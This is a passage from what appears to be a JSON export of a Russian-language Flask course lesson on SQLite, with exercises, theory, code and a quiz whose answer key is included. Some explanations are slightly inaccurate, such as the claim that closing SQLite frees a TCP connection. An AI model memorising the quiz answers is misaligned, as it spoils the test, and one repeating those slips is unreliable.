{
    "sections": [
        {
            "id": 1,
            "number": 1,
            "name": "Основы Flask",
            "slug": "basics"
        },
        {
            "id": 2,
            "number": 2,
            "name": "Практический пример создания web-приложения типа Блог ",
            "slug": "blog"
        },
        {
            "id": 4,
            "number": 3,
            "name": "Добавление аутентификации с помощью Flask-Login",
            "slug": "flask-login"
        },
        {
            "id": 5,
            "number": 4,
            "name": "Практические примеры мини-приложений",
            "slug": "mini-apps"
        }
    ],
    "lessons": [
        {
            "id": 14,
            "section_id": 1,
            "number": 11,
            "name": "Соединение Flask и базы данных",
            "slug": "database",
            "content": {
                "tasks": [
                    {
                        "id": 1,
                        "content": "<p>Реализуйте обновление элемента:</p><p>Добавьте кнопку «Редактировать» рядом с каждым элементом.</p><p>Сделайте маршрут /edit/ с формой Flask-WTF для изменения имени.</p><p>После изменения элемента делайте редирект на главную страницу.</p>"
                    },
                    {
                        "id": 2,
                        "content": "<p>Добавьте проверку уникальности имени при добавлении элемента:</p><p>Если имя уже есть в таблице, не добавлять и выводить сообщение об ошибке на странице (например, «Такое имя уже есть»).</p><p>Используйте валидацию в ItemForm или проверку в маршруте index().</p>"
                    },
                    {
                        "id": 3,
                        "content": "<p>Сделайте пагинацию списка элементов:</p><p>Показывайте только 5 элементов на странице.</p><p>Добавьте кнопки «Следующая» и «Предыдущая» для навигации.</p><p><span style=\"font-family:;\">Используйте параметры GET (?page=1) для перехода между страницами</span></p>"
                    },
                    {
                        "id": 4,
                        "content": "<p>Сделайте сортировку элементов:</p><p>Добавьте ссылки «Сортировать по имени ↑↓» на странице.</p><p>Меняйте порядок сортировки (ASC или DESC) в SQL-запросе.</p>"
                    },
                    {
                        "id": 5,
                        "content": "<p>Добавьте подтверждение удаления через JavaScript:</p><p>Перед отправкой формы на /delete/ выводите диалоговое окно «Вы уверены?».</p><p><span style=\"font-family:;\">Если пользователь отменил, запрос не отправляется.</span></p>"
                    },
                    {
                        "id": 6,
                        "content": "<p>Сделайте логирование действий:</p><p>Каждый раз при добавлении или удалении элемента записывайте событие в текстовый файл log.txt:</p><p>«Добавлен элемент: [name]»</p><p>«Удалён элемент: [id] [name]»</p><p>Используйте модуль Python logging или обычное открытие файла.</p>"
                    },
                    {
                        "id": 7,
                        "content": "<p>Сделайте экспорт списка элементов в CSV:</p><p>Добавьте кнопку «Скачать CSV».</p><p>При нажатии генерируйте CSV с колонками id, name.</p><p>Файл должен скачиваться на компьютер пользователя.</p>"
                    },
                    {
                        "id": 8,
                        "content": "<p>Сделайте фильтр по длине имени:</p><p>Добавьте селектор «Показывать имена длиной: …» (например, 1–3 символа, 4–6, &gt;6).</p><p>Фильтруйте элементы в базе по длине поля name.</p><p>Используйте SQL-функцию LENGTH(name) для фильтрации.</p>"
                    }
                ],
                "tests": [
                    {
                        "id": 1,
                        "options": [
                            "Операция, которая выполняется по принципу «всё или ничего» ",
                            "Процесс резервного копирования базы данных",
                            "Сбор статистики о пользователях",
                            "Метод шифрования данных в базе"
                        ],
                        "question": "Что такое транзакция в реляционной базе данных?",
                        "correct_index": 0
                    },
                    {
                        "id": 2,
                        "options": [
                            "Хранит данные между разными пользователями",
                            "Хранит данные в рамках одного запроса ",
                            "Служит для отправки HTTP-запросов",
                            "Управляет шаблонами Jinja2"
                        ],
                        "question": "Что делает объект g во Flask?",
                        "correct_index": 1
                    },
                    {
                        "id": 3,
                        "options": [
                            "Нарушает семантику HTTP и может вызвать XSS-уязвимости ",
                            "Не работает в современных браузерах",
                            "Создаёт лишние файлы на сервере",
                            "Блокирует работу базы данных"
                        ],
                        "question": "Почему использование <script>window.location='/'</script> для редиректа плохая практика?",
                        "correct_index": 0
                    },
                    {
                        "id": 4,
                        "options": [
                            "Удаляет старые данные из базы",
                            "Проверяет корректность данных и отправку формы методом POST ",
                            "Создаёт таблицу в базе данных",
                            "Обрабатывает GET-запросы"
                        ],
                        "question": "Что делает метод validate_on_submit() у Flask-WTF формы?",
                        "correct_index": 1
                    },
                    {
                        "id": 5,
                        "options": [
                            "INSERT INTO items (name) VALUES (?) ",
                            "SELECT * FROM items",
                            "DELETE FROM items WHERE id = ?",
                            "UPDATE items SET name=?"
                        ],
                        "question": "Какой SQL-запрос используется для добавления нового элемента в таблицу items?",
                        "correct_index": 0
                    },
                    {
                        "id": 6,
                        "options": [
                            "Создаёт новую таблицу в базе данных",
                            "Обрабатывает POST-запросы",
                            "Запускает сервер Flask",
                            "Закрывает подключение к базе данных после завершения запроса "
                        ],
                        "question": "Что делает декоратор @app.teardown_appcontext?",
                        "correct_index": 3
                    }
                ],
                "theory_html": "<h4>Введение</h4><p>Существуют две основные категории систем управления базами данных:</p><p>Реляционные (SQL) базы данных</p><p>Нереляционные (NoSQL) базы данных</p><p>&nbsp;</p><p>Реляционные базы данных (SQL)</p><p>Реляционные базы данных хранят данные в виде таблиц, состоящих из строк и колонок, и используют первичные и внешние ключи для установления связей между таблицами.</p><p>Важной особенностью SQL-баз данных является поддержка транзакций.</p><p>Транзакция — это набор операций, который выполняется по принципу «всё или ничего».</p><p>Если одна из операций завершается ошибкой, все изменения откатываются.</p><p>Примеры SQL-БД:</p><p>SQLite</p><p>PostgreSQL</p><p>MySQL / MariaDB</p><p>Oracle</p><p>&nbsp;</p><p>Нереляционные базы данных (NoSQL)</p><p>NoSQL-базы данных не используют классическую табличную структуру.</p><p>Вместо этого они могут хранить данные в виде:</p><p>документов (MongoDB),</p><p>пар «ключ–значение» (Redis),</p><p>графов (Neo4j),</p><p>широких колонок (Cassandra).</p><p>&nbsp;</p><p>NoSQL-решения часто выбирают:</p><p>для горизонтального масштабирования,</p><p>для работы с неструктурированными данными,</p><p>для высоконагруженных систем.</p><p>&nbsp;</p><p><strong>Почему мы начинаем с SQLite ?</strong></p><p>Flask обеспечивает лёгкую и удобную работу с различными базами данных.</p><p>В этой лекции мы осознанно используем SQLite, потому что:</p><p>она не требует установки сервера,</p><p>входит в стандартную библиотеку Python,</p><p>хранит данные в одном файле,</p><p>идеально подходит для обучения, тестирования и небольших проектов.</p><p>За этот урок мы:</p><p>подключим SQLite к Flask-приложению,</p><p>создадим таблицу,</p><p>научимся добавлять и удалять данные через веб-интерфейс,</p><p>используем Flask-WTF и WTForms для форм и CSRF-защиты.</p><p>&nbsp;</p><h4>Простейшее Flask-приложение с базой данных</h4><p><strong>&nbsp;</strong></p><p>1. Структура проекта.</p><p>Создайте директорию проекта flask-db.</p><p>Самостоятельно установите виртуальное окружение, активируйте его, установите Flask, проверьте установку, установите flask-wtf, проверьте установку.</p><p>Модуль (пакет, библиотеку) базы данных sqlite3 устанавливать не нужно, т.к. она входит в ядро самого python.</p><p>&nbsp;</p><p>Внутри директории создайте следующую структуру:</p><pre><code class=\"language-python\">flask-db/\r\n│\r\n├── app.py\r\n├── example.db\r\n├── templates/\r\n│&nbsp;&nbsp; ├── base.html\r\n│&nbsp;&nbsp; └── index.html\r\n└── static/</code></pre><p>Все HTML-шаблоны будут храниться в папке templates.</p><p>&nbsp;</p><p><strong>2. Сначала напишем приложение целиком без объяснений, а потом всё подробно объясним.</strong></p><p>&nbsp;</p><p>2.1. Код файла app.py:</p><pre><code class=\"language-python\">import sqlite3\r\n \r\nfrom flask import (\r\n  Flask, request, render_template,\r\n  g, redirect, url_for\r\n)\r\nfrom flask_wtf import FlaskForm\r\nfrom wtforms import StringField, SubmitField\r\nfrom wtforms.validators import DataRequired\r\n \r\napp = Flask(__name__)\r\n \r\napp.config['SECRET_KEY'] = 'dev-secret-key'\r\n \r\n# Создание базы данных SQLite\r\nDATABASE = 'example.db'\r\n \r\n# Функция получения подключения к БД\r\ndef get_db():\r\n  db = getattr(g, '_database', None)\r\n  if db is None:\r\n    db = g._database = sqlite3.connect(DATABASE)\r\n  return db\r\n \r\n# Закрытие подключения\r\n@app.teardown_appcontext\r\ndef close_connection(exception):\r\n  db = getattr(g, '_database', None)\r\n  if db is not None:\r\n    db.close()\r\n \r\n# Инициализация базы данных\r\ndef init_db():\r\n  with app.app_context():\r\n    db = get_db()\r\n    cursor = db.cursor()\r\n    cursor.execute(\"\"\"\r\n      CREATE TABLE IF NOT EXISTS items (\r\n        id INTEGER PRIMARY KEY,\r\n        name TEXT NOT NULL\r\n      )\r\n    \"\"\")\r\n    db.commit()\r\n \r\n# Flask-WTF форма\r\nclass ItemForm(FlaskForm):\r\n  name = StringField(\r\n    'Имя',\r\n    validators=[DataRequired()]\r\n  )\r\n  submit = SubmitField('Добавить')\r\n \r\n# Маршрут главной страницы с логикой работы с БД\r\n@app.route('/', methods=['GET', 'POST'])\r\ndef index():\r\n  form = ItemForm()\r\n  db = get_db()\r\n  cursor = db.cursor()\r\n \r\n  if form.validate_on_submit():\r\n    cursor.execute(\r\n      'INSERT INTO items (name) VALUES (?)',\r\n      (form.name.data,)\r\n    )\r\n    db.commit()\r\n    return redirect(url_for('index'))\r\n \r\n  cursor.execute('SELECT * FROM items')\r\n  items = cursor.fetchall()\r\n \r\n  return render_template(\r\n    'index.html',\r\n    items=items,\r\n    form=form\r\n  )\r\n \r\n# Маршрут и функция удаления элемента\r\n@app.route('/delete/&lt;int:item_id&gt;', methods=['POST'])\r\ndef delete_item(item_id):\r\n  db = get_db()\r\n  cursor = db.cursor()\r\n  cursor.execute(\r\n    'DELETE FROM items WHERE id = ?',\r\n    (item_id,)\r\n  )\r\n  db.commit()\r\n  return redirect(url_for('index'))\r\n \r\n# Запуск приложения с инициализацией БД\r\nif __name__ == '__main__':\r\n  init_db()\r\n  app.run(debug=True)</code></pre><p>&nbsp;</p><p>2.3. HTML-шаблоны</p><p>&nbsp;</p><p>templates/base.html :</p><pre><code class=\"language-html\">&lt;!DOCTYPE html&gt;\r\n&lt;html lang=\"ru\"&gt;\r\n&lt;head&gt;\r\n  &lt;meta charset=\"UTF-8\"&gt;\r\n  &lt;title&gt;{% block title %}Flask + SQLite{% endblock %}&lt;/title&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n  {% block content %}\r\n  {% endblock %}\r\n&lt;/body&gt;\r\n&lt;/html&gt;</code></pre><p>&nbsp;</p><p>templates/index.html :</p><pre><code class=\"language-jinja2\">{% extends 'base.html' %}\r\n \r\n{% block content %}\r\n&lt;h1&gt;Список имён&lt;/h1&gt;\r\n&lt;ul&gt;\r\n  {% for item in items %}\r\n  &lt;li&gt;\r\n    {{ item[1] }}\r\n    &lt;form action=\"{{ url_for('delete_item', item_id=item[0]) }}\" method=\"post\" style=\"display:inline;\"&gt;\r\n      {{ form.csrf_token }}\r\n      &lt;button type=\"submit\"&gt;Удалить&lt;/button&gt;\r\n    &lt;/form&gt;\r\n  &lt;/li&gt;\r\n  {% endfor %}\r\n&lt;/ul&gt;\r\n \r\n&lt;form method=\"post\"&gt;\r\n  {{ form.csrf_token }}\r\n  {{ form.name }}\r\n  {{ form.submit }}\r\n&lt;/form&gt;\r\n{% endblock %}</code></pre><p>&nbsp;&nbsp;</p><p>3. Запустите приложение и протестируйте.</p><p>При вводе имён в форме, и нажатии кнопки Добавить, они добавляются в базу данных, и уже из базы, выводятся на страницу сверху формы.</p><p>При нажатии кнопки Удалить, данные удаляются из базы данных, и список обновляется. Вы можете открыть файл базы данных example.db, но вряд ли вы там что то поймёте.</p><p>&nbsp;</p><p>&nbsp;</p><p><strong>4. Теперь сделаем подробное объяснение всего значимого кода</strong></p><p>&nbsp;</p><p>4.1. Код главного файла приложения app.py:</p><p>&nbsp;</p><p><strong>Раздел импортов</strong></p><pre><code class=\"language-python\">import sqlite3\r\n \r\nfrom flask import (\r\n &nbsp;&nbsp; Flask, request, render_template,\r\n &nbsp;&nbsp; g, redirect, url_for\r\n)\r\n \r\nfrom flask_wtf import FlaskForm\r\nfrom wtforms import StringField, SubmitField\r\nfrom wtforms.validators import DataRequired</code></pre><p>Объяснение импортов:</p><p>sqlite3 — встроенный модуль Python (не Flask) для работы с SQLite</p><p>Flask — основной класс приложения</p><p>request — доступ к данным HTTP-запроса</p><p>render_template — рендеринг HTML-шаблонов</p><p>g — объект контекста запроса</p><p>redirect, url_for — корректные HTTP-редиректы</p><p>FlaskForm, WTForms — формы и CSRF-защита</p><p>&nbsp;</p><p>&nbsp;</p><p><strong>Создание приложения и конфигурация</strong></p><pre><code class=\"language-python\">app = Flask(__name__)\r\n \r\napp.config['SECRET_KEY'] = 'dev-secret-key'</code></pre><p>SECRET_KEY необходим для:</p><p>работы Flask-WTF,</p><p>защиты от CSRF-атак,</p><p>подписания сессий.</p><p>&nbsp;</p><p>&nbsp;</p><p><strong>Создание базы данных SQLite</strong></p><p><code>DATABASE = 'example.db'</code></p><p>'example.db' - это имя файла базы данных SQLite.</p><p>&nbsp;</p><p>&nbsp;</p><p><strong>Функция получения подключения к БД</strong></p><pre><code class=\"language-python\">def get_db():\r\n &nbsp;&nbsp; db = getattr(g, '_database', None)\r\n &nbsp;&nbsp; if db is None:\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; db = g._database = sqlite3.connect(DATABASE)\r\n &nbsp;&nbsp; return db</code></pre><p>Объяснение:</p><p>1. Назначение функции get_db()</p><p>Эта функция отвечает за получение подключения к базе данных SQLite, привязанного к текущему HTTP-запросу Flask-приложения.</p><p>Главная идея:</p><p>одно подключение к БД на один запрос</p><p>без глобальных переменных</p><p>с автоматическим переиспользованием подключения внутри одного запроса</p><p>&nbsp;</p><p>2. Объект g — контекст запроса Flask</p><p>g — это специальный объект Flask, который:</p><p>существует только во время обработки одного запроса.</p><p>- уникален для каждого запроса и каждого пользователя</p><p>- используется для хранения временных данных (например, подключений, текущего пользователя, кэша)</p><p>Важно:</p><p>при новом HTTP-запросе g создаётся заново</p><p>после завершения запроса g уничтожается</p><p>Это делает g идеальным местом для хранения подключения к базе данных.</p><p>&nbsp;</p><p>3. Строка</p><p><code>db = getattr(g, '_database', None)</code></p><p>Что здесь происходит:</p><p>getattr(obj, attr, default) пытается получить атрибут attr у объекта obj</p><p>если атрибута нет — возвращается default</p><p>В данном случае:</p><p>мы пытаемся получить g._database</p><p>если подключение уже было создано ранее в этом запросе, оно будет найдено</p><p>если нет — db получит значение None</p><p>Почему используется getattr, а не g._database напрямую:</p><p>прямой доступ вызвал бы AttributeError, если атрибут ещё не существует</p><p>getattr позволяет безопасно проверить наличие значения</p><p>&nbsp;</p><p>4. Проверка наличия подключения</p><p><code>if db is None</code></p><p>Этот if определяет:</p><p>создано ли подключение к базе данных в рамках текущего запроса</p><p>Сценарии:</p><p>первый вызов get_db() → подключения ещё нет → db is None</p><p>повторный вызов get_db() → подключение уже есть → db содержит объект Connection</p><p>&nbsp;</p><p>5. Создание и сохранение подключения</p><p><code>db = g._database = sqlite3.connect(DATABASE)</code></p><p>Здесь происходит сразу два действия:</p><p>Создаётся новое подключение:</p><p><code>sqlite3.connect(DATABASE)</code></p><p>Это подключение:</p><p>сохраняется в g._database</p><p>одновременно присваивается переменной db</p><p>Почему так:</p><p>чтобы при последующих вызовах get_db() в этом же запросе</p><p>подключение было доступно без повторного создания</p><p>гарантируется одно подключение на запрос</p><p>&nbsp;</p><p>6. Возврат подключения</p><p><code>return db</code></p><p>Функция всегда возвращает:</p><p>либо уже существующее подключение</p><p>либо только что созданное</p><p>Для вызывающего кода неважно:</p><p>создавалось ли подключение сейчас,</p><p>или было переиспользовано</p><p>Это скрывает детали реализации и делает код аккуратным.</p><p>&nbsp;</p><p>Итоговая логика работы функции</p><p>Проверить, есть ли подключение в g</p><p>Если нет — создать его и сохранить в g</p><p>Вернуть подключение</p><p>Повторные вызовы в рамках одного запроса используют то же самое подключение</p><p>&nbsp;</p><p>Почему это правильный и рекомендуемый подход</p><p>- нет глобальных подключений</p><p>- нет лишних соединений с БД</p><p>- потокобезопасно (каждый запрос имеет свой g)</p><p>- хорошо масштабируется</p><p>- соответствует рекомендациям Flask</p><p>&nbsp;</p><p>&nbsp;</p><p><strong>Закрытие подключения</strong></p><pre><code class=\"language-python\">@app.teardown_appcontext\r\ndef close_connection(exception):\r\n &nbsp;&nbsp; db = getattr(g, '_database', None)\r\n &nbsp;&nbsp; if db is not None:\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; db.close()</code></pre><p>Объяснение:</p><p>Этот код гарантирует корректное закрытие соединения с базой данных после завершения обработки каждого запроса Flask-приложением — независимо от того, был запрос успешным или завершился ошибкой.</p><p>Он является частью механизма управления жизненным циклом запроса во Flask.</p><p>&nbsp;</p><p><code>@app.teardown_appcontext</code></p><p>Это декоратор Flask, который регистрирует функцию как обработчик события:</p><p>«Контекст приложения уничтожается»</p><p>Что это значит на практике:</p><p>функция, помеченная teardown_appcontext,</p><p>вызывается автоматически:</p><p>- после обработки каждого HTTP-запроса</p><p>- при возникновении исключения</p><p>- при завершении фоновых задач, работающих в контексте приложения.</p><p>Функция выполняется всегда, даже если:</p><p>- произошло необработанное исключение</p><p>- запрос завершился ошибкой 500</p><p>&nbsp;</p><p><code>def close_connection(exception)</code></p><p>Функция получает один аргумент:</p><p><code>exception</code></p><p>содержит объект исключения, если оно произошло</p><p>равен None, если запрос завершился без ошибок.</p><p>Параметр обязателен по сигнатуре, даже если ты его не используешь</p><p>Flask передаёт его автоматически</p><p>&nbsp;</p><p><code>db = getattr(g, '_database', None)</code></p><p>Здесь происходит безопасное получение соединения с БД.</p><p>g — это контекстный объект Flask</p><p>он существует только в рамках одного запроса</p><p>используется для хранения временных данных:</p><p>- соединение с БД</p><p>- пользователь</p><p>- кэшированные значения</p><p><code>getattr(..., None)</code></p><p>- безопасно возвращает None</p><p>- не ломает приложение</p><p>- позволяет корректно обработать ситуацию, когда БД вообще не использовалась</p><p>Это защитный и правильный паттерн.</p><p>&nbsp;</p><p><code>if db is not None</code></p><p>Проверка нужна потому что:</p><p>- не каждый запрос работает с БД</p><p>- соединение может не существовать</p><p>- закрывать None нельзя</p><p>Этот if гарантирует, что:</p><p>метод close() будет вызван только при наличии реального соединения</p><p>&nbsp;</p><p><code>db.close()</code></p><p>Здесь происходит фактическое освобождение ресурса:</p><p>- закрывается TCP-соединение с БД</p><p>- освобождаются файловые дескрипторы</p><p>Если этого не делать:</p><p>- соединения будут накапливаться</p><p>- база данных начнёт отказывать в новых подключениях</p><p>- приложение станет нестабильным под нагрузкой</p><p>&nbsp;</p><p>Что в итоге делает этот код ?</p><p>- после каждого запроса</p><p>- даже при ошибке</p><p>- даже если БД использовалась частично</p><p>Flask:</p><p>- проверяет, было ли создано соединение с БД</p><p>- корректно его закрывает</p><p>- предотвращает утечки ресурсов</p><p>- поддерживает стабильную работу приложения</p><p>&nbsp;</p><p>&nbsp;</p><p><strong>Инициализация базы данных</strong></p><pre><code class=\"language-python\">def init_db():\r\n &nbsp;&nbsp; with app.app_context():\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; db = get_db()\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cursor = db.cursor()\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cursor.execute(\"\"\"\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CREATE TABLE IF NOT EXISTS items (\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; id INTEGER PRIMARY KEY,\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; name TEXT NOT NULL\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; )\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \"\"\")\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; db.commit()</code></pre><p>Объяснение:</p><p><code>def init_db()</code></p><p>Объявляется функция init_db, задача которой — однократно подготовить структуру базы данных.</p><p>Обычно такие функции вызываются:</p><p>- при первом запуске приложения;</p><p>- при деплое приложения.</p><p>Важно: эта функция не работает с данными, а только создаёт структуру (DDL — Data Definition Language).</p><p>&nbsp;</p><p><code>with app.app_context()</code></p><p>Создаётся контекст приложения Flask.</p><p>Flask использует контексты (app context и request context) для хранения:</p><p>- конфигурации приложения;</p><p>- объектов вроде g, current_app;</p><p>- ресурсов, привязанных к приложению (включая подключение к БД).</p><p>&nbsp;</p><p><code>db = get_db()</code></p><p>Здесь получается соединение с базой данных.</p><p>- возвращает уже открытое соединение, если оно есть;</p><p>- либо создаёт новое соединение и сохраняет его в g.</p><p>В контексте SQLite это обычно объект:</p><p><code>sqlite3.Connection</code></p><p>Важно:</p><p>соединение живёт в рамках текущего контекста приложения;</p><p>закрывается автоматически при его завершении (если это реализовано в teardown_appcontext).</p><p>&nbsp;</p><p><code>cursor = db.cursor()</code></p><p>Создаётся курсор базы данных.</p><p>Курсор:</p><p>- используется для выполнения SQL-запросов;</p><p>- хранит состояние выполнения;</p><p>- позволяет получать результаты (fetchone, fetchall).</p><p>Почему нельзя выполнять SQL напрямую через db:</p><p>стандартный DB-API (PEP 249) предполагает работу именно через курсоры;</p><p>курсор — это интерфейс между Python и SQL.</p><p>&nbsp;</p><p><code>cursor.execute(\"\"\" ... \"\"\")</code></p><p>Выполняется SQL-запрос создания таблицы:</p><pre><code class=\"language-python\">CREATE TABLE IF NOT EXISTS items (\r\n &nbsp;&nbsp; id INTEGER PRIMARY KEY,\r\n &nbsp;&nbsp; name TEXT NOT NULL\r\n)</code></pre><p>Разбор запроса:</p><p><code>CREATE TABLE</code></p><p>Создаёт новую таблицу в базе данных.</p><p><code>IF NOT EXISTS</code></p><p>Предотвращает ошибку, если таблица уже существует.</p><p>Без этого условия повторный запуск функции привёл бы к ошибке:</p><p>sqlite3.OperationalError: table items already exists</p><p>Использование IF NOT EXISTS делает функцию:</p><p>идемпотентной;</p><p>безопасной для повторного вызова;</p><p>удобной для автоматизации.</p><p>&nbsp;</p><p>Структура таблицы items</p><p><code>id INTEGER PRIMARY KEY</code></p><p>основной ключ таблицы;</p><p>- уникально идентифицирует каждую строку;</p><p>- автоинкрементируется при вставке новых записей.</p><p><code>name TEXT NOT NULL</code></p><p>текстовое поле;</p><p>не может быть NULL;</p><p>гарантирует, что каждая запись имеет имя.</p><p>&nbsp;</p><p><code>db.commit()</code></p><p>Фиксирует изменения в базе данных.</p><p>Почему это важно:</p><p>SQLite по умолчанию работает в транзакциях;</p><p>без commit():</p><p>- таблица может быть создана только временно;</p><p>- изменения будут отменены при закрытии соединения.</p><p>commit() гарантирует, что:</p><p>- структура таблицы сохранена на диске;</p><p>- изменения станут доступными для последующих запросов.</p><p>&nbsp;</p><p>Итоговое назначение функции init_db():</p><p>- создаёт таблицу items, если она ещё не существует;</p><p>- безопасна для многократного запуска;</p><p>- корректно работает вне HTTP-запроса;</p><p>- подготавливает базу данных к дальнейшей работе приложения.</p><p>&nbsp;</p><p>&nbsp;</p><p><strong>Flask-WTF форма</strong></p><pre><code class=\"language-python\">class ItemForm(FlaskForm):\r\n &nbsp;&nbsp; name = StringField(\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'Имя',\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; validators=[DataRequired()]\r\n &nbsp;  )\r\n &nbsp;&nbsp; submit = SubmitField('Добавить')</code></pre><p>Зачем нужна форма?</p><p>автоматическая CSRF-защита</p><p>валидация данных</p><p>упрощение работы с HTML-формами</p><p>Для понимания кода Flask-WTF форм можете вернуться к предыдущей лекции.</p><p>&nbsp;</p><p>&nbsp;</p><p><strong>Маршруты приложения</strong></p><p>&nbsp;</p><p><strong>Главная страница</strong></p><pre><code class=\"language-python\">@app.route('/', methods=['GET', 'POST'])\r\ndef index():\r\n &nbsp;&nbsp; form = ItemForm()\r\n &nbsp;&nbsp; db = get_db()\r\n &nbsp;&nbsp; cursor = db.cursor()\r\n \r\n &nbsp;&nbsp; if form.validate_on_submit():\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cursor.execute(\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'INSERT INTO items (name) VALUES (?)',\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (form.name.data,)\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; )\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; db.commit()\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return redirect(url_for('index'))\r\n \r\n &nbsp;&nbsp; cursor.execute('SELECT * FROM items')\r\n &nbsp;&nbsp; items = cursor.fetchall()\r\n \r\n &nbsp;&nbsp; return render_template(\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'index.html',\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; items=items,\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; form=form\r\n &nbsp;&nbsp; )</code></pre><p>Маршрут главной страницы</p><p><code>@app.route('/', methods=['GET', 'POST'])</code></p><p>Регистрирует обработчик URL / (главная страница сайта).</p><p>GET — используется для:</p><p>первичной загрузки страницы;</p><p>отображения списка элементов;</p><p>показа пустой формы добавления.</p><p>POST — используется для:</p><p>отправки данных формы;</p><p>добавления нового элемента в базу данных.</p><p>Flask автоматически выбирает нужный метод в зависимости от HTTP-запроса браузера.</p><p>&nbsp;</p><p><code>form = ItemForm()</code></p><p>Создаётся экземпляр формы ItemForm.</p><p>Flask-WTF:</p><p>- связывает форму с текущим HTTP-запросом;</p><p>- извлекает данные из request.form при POST;</p><p>- подготавливает CSRF-токен;</p><p>- хранит данные полей и ошибки валидации.</p><p>&nbsp;</p><p><code>db = get_db()</code></p><p><code>cursor = db.cursor()</code></p><p>get_db() — функция получения подключения к базе данных:</p><p>обычно возвращает соединение SQLite;</p><p>может хранить соединение в g (контексте запроса).</p><p>cursor — объект для выполнения SQL-запросов.</p><p>&nbsp;</p><p>Обработка отправки формы</p><p><code>if form.validate_on_submit()</code></p><p>Это ключевая строка логики маршрута.</p><p>validate_on_submit() делает сразу несколько вещей:</p><p>- проверяет, что запрос — POST;</p><p>- проверяет, что форма была отправлена;</p><p>- выполняет все валидаторы полей (DataRequired, Length и т.д.);</p><p>- проверяет CSRF-токен.</p><p>Если:</p><p>запрос GET → False;</p><p>форма POST, но данные невалидны → False;</p><p>форма POST и данные валидны → True.</p><p>&nbsp;</p><pre><code class=\"language-python\">cursor.execute(\r\n  'INSERT INTO items (name) VALUES (?)',\r\n  (form.name.data,)\r\n)</code></pre><p>Выполняется параметризованный SQL-запрос:</p><p>вместо ? вставляется содержимое form.name.data.</p><p>form.name.data — значение поля формы после валидации.</p><p>Почему так правильно:</p><p>защита от SQL-инъекций;</p><p>данные уже проверены WTForms.</p><p>&nbsp;</p><p><code>db.commit()</code></p><p>Фиксирует изменения в базе данных.</p><p>Без commit() вставка записи не будет сохранена.</p><p>Это завершение транзакции записи.</p><p>&nbsp;</p><p><code>return redirect(url_for('index'))</code></p><p>Выполняется HTTP-редирект (302 Found).</p><p>Браузер получает команду:</p><p>«Перейди снова на / с методом GET»</p><p>Зачем это нужно:</p><p>предотвращает повторную отправку формы при обновлении страницы (F5);</p><p>реализует паттерн Post → Redirect → Get (PRG);</p><p>делает поведение страницы предсказуемым.</p><p>&nbsp;</p><p>Получение данных для отображения</p><p><code>cursor.execute('SELECT * FROM items')</code></p><p>Выполняется запрос на получение всех элементов.</p><p><code>items = cursor.fetchall()</code></p><p>fetchall() возвращает список кортежей;</p><p>Эти данные будут использованы в шаблоне для вывода списка.</p><p>&nbsp;</p><p>Рендеринг шаблона</p><pre><code class=\"language-python\"> &nbsp;&nbsp; return render_template(\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'index.html',\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; items=items,\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; form=form\r\n &nbsp;&nbsp; )</code></pre><p>Возвращается HTML-страница, сгенерированная Jinja2.</p><p>В шаблон передаются:</p><p>items — список элементов из базы;</p><p>form — объект формы (с данными и ошибками).</p><p>В шаблоне можно:</p><p>- отрисовать список элементов;</p><p>- вывести форму;</p><p>- показать ошибки валидации, если они есть.</p><p>&nbsp;</p><p>Итог: что делает этот маршрут:</p><p>- отображает список элементов из базы данных;</p><p>- обрабатывает добавление новых данных через форму;</p><p>- использует валидированную форму Flask-WTF;</p><p>- корректно разделяет GET и POST-логику;</p><p>- применяет HTTP-редирект по паттерну PRG;</p><p>- работает как единая точка управления главной страницей.</p><p>&nbsp;</p><p>&nbsp;</p><p><strong>Удаление элемента</strong></p><pre><code class=\"language-python\">@app.route('/delete/&lt;int:item_id&gt;', methods=['POST'])\r\ndef delete_item(item_id):\r\n &nbsp;&nbsp; db = get_db()\r\n &nbsp;&nbsp; cursor = db.cursor()\r\n &nbsp;&nbsp; cursor.execute(\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'DELETE FROM items WHERE id = ?',\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (item_id,)\r\n &nbsp;&nbsp; )\r\n &nbsp;&nbsp; db.commit()\r\n &nbsp;&nbsp; return redirect(url_for('index'))</code></pre><p>Объяснение:</p><p>Декоратор маршрута</p><pre><code 